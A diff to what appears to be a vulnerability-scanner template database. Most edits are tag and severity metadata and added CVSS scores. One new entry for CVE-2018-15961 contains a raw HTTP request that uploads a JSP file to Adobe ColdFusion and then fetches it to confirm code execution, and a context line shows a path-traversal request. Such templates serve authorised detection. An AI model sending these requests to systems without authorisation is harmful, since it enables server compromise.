@@ -12379,7 +12379,7 @@
           "http://blog.orange.tw/2019/07/attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto.html"
         ],
         "severity": "critical",
-        "tags": "cve,cve2017,rce,vpn,paloalto,globalprotect"
+        "tags": "cve,cve2017,rce,vpn,panos,globalprotect"
       },
       "requests": [
         {
@@ -14267,7 +14267,7 @@
         "name": "GlobalProtect Login page XSS",
         "reference": "https://nvd.nist.gov/vuln/detail/CVE-2018-10141",
         "severity": "medium",
-        "tags": "globalprotect,xss,cve,cve2018,vpn"
+        "tags": "cve,cve2018,panos,vpn,globalprotect,xss"
       },
       "requests": [
         {
@@ -15558,6 +15558,49 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2018-15961",
+      "info": {
+        "author": "SkyLark-Lab,ImNightmaree",
+        "classification": {
+          "cve-id": "CVE-2018-15961",
+          "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+          "cvss-score": 9.8,
+          "cwe-id": "CWE-434"
+        },
+        "description": "Adobe ColdFusion versions July 12 release (2018.0.0.310739), Update 6 and earlier, and Update 14 and earlier have an unrestricted file upload vulnerability. Successful exploitation could lead to arbitrary code execution.",
+        "name": "Adobe ColdFusion Unrestricted file upload RCE",
+        "reference": [
+          "https://nvd.nist.gov/vuln/detail/CVE-2018-15961",
+          "https://github.com/xbufu/CVE-2018-15961"
+        ],
+        "severity": "critical",
+        "tags": "cve,cve2018,adobe,rce,coldfusion,fileupload"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "ddbb3e76f92e78c445c8ecb392beb225"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "POST /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary=---------------------------24464570528145\n\n-----------------------------24464570528145\nContent-Disposition: form-data; name=\"file\"; filename=\"{{randstr}}.jsp\"\nContent-Type: image/jpeg\n\n<%@ page import=\"java.util.*,java.io.*\"%>\n<%@ page import=\"java.security.MessageDigest\"%>\n<%\nString cve = \"CVE-2018-15961\";\nMessageDigest alg = MessageDigest.getInstance(\"MD5\");\nalg.reset();\nalg.update(cve.getBytes());\nbyte[] digest = alg.digest();\nStringBuffer hashedpasswd = new StringBuffer();\nString hx;\nfor (int i=0;i<digest.length;i++){\n  hx =  Integer.toHexString(0xFF & digest[i]);\n  if(hx.length() == 1){hx = \"0\" + hx;}\n  hashedpasswd.append(hx);\n}\nout.println(hashedpasswd.toString());\n%>\n-----------------------------24464570528145\nContent-Disposition: form-data; name=\"path\"\n\n{{randstr}}.jsp\n-----------------------------24464570528145--\n",
+            "GET /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/uploadedFiles/{{randstr}}.jsp HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
@@ -35440,7 +35483,13 @@
       "id": "CVE-2021-31602",
       "info": {
         "author": "pussycat0x",
-        "description": "An issue was discovered in Hitachi Vantara Pentaho through 9.1 and Pentaho Business Intelligence Server through 7.x. The Security Model has different layers of Access Control. One of these layers is the applicationContext security, which is defined in the applicationContext-spring-security.xml file. The default configuration allows an unauthenticated user with no previous knowledge of the platform settings to extract pieces of information without possessing valid credentials.\n\n",
+        "classification": {
+          "cve-id": "CVE-2021-31602",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+          "cvss-score": 7.5,
+          "cwe-id": "CWE-863"
+        },
+        "description": "An issue was discovered in Hitachi Vantara Pentaho through 9.1 and Pentaho Business Intelligence Server through 7.x. The Security Model has different layers of Access Control. One of these layers is the applicationContext security, which is defined in the applicationContext-spring-security.xml file. The default configuration allows an unauthenticated user with no previous knowledge of the platform settings to extract pieces of information without possessing valid credentials.",
         "metadata": {
           "shodan-query": "Pentaho"
         },
@@ -35450,7 +35499,7 @@
           "https://portswigger.net/daily-swig/remote-code-execution-sql-injection-bugs-uncovered-in-pentaho-business-analytics-software",
           "https://hawsec.com/publications/pentaho/HVPENT210401-Pentaho-BA-Security-Assessment-Report-v1_1.pdf"
         ],
-        "severity": "medium",
+        "severity": "high",
         "tags": "cve,cve2021,pentaho,auth-bypass"
       },
       "requests": [
@@ -38402,6 +38451,12 @@
       "id": "CVE-2021-42237",
       "info": {
         "author": "pdteam",
+        "classification": {
+          "cve-id": "CVE-2021-42237",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+          "cvss-score": 9.8,
+          "cwe-id": "CWE-502"
+        },
         "description": "Sitecore XP 7.5 Initial Release to Sitecore XP 8.2 Update-7 is vulnerable to an insecure deserialization attack where it is possible to achieve remote command execution on the machine. No authentication or special configuration is required to exploit this vulnerability.",
         "metadata": {
           "shodan-query": "http.title:\"SiteCore\""
